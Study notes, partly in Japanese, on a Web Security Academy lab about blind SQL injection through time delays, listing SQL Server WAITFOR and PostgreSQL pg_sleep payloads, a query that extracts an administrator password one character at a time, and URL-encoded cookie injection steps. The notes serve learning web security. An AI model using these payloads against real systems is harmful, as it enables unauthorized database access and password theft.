Date: 2025-09-18
Tags: 
Links: [[WSA]], [[SQL]]
***

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'xyz'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'xyz'; IF (1=1) WAITFOR DELAY '0:0:10'--`
```
>IF文は汎用性がないからCASE文の方が良い。

- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

```sql
'xyz'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
```

***
## Lab

1. **time delayが有効と確認**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
IF文はデータベースによって違いがある。CASE文の方が汎用的。
**;のエンコーディングは必要。**


2. **administratorの存在確認**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
>usersテーブルの全ての行を調査し、username='administrator'があれば１０秒待つ。
>--> administratorの存在確認になる。

3. **passwordの長さ確認。→総当たり**
　念の為一度にレスポンスを一回しか送れないようにする。
***
# References

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval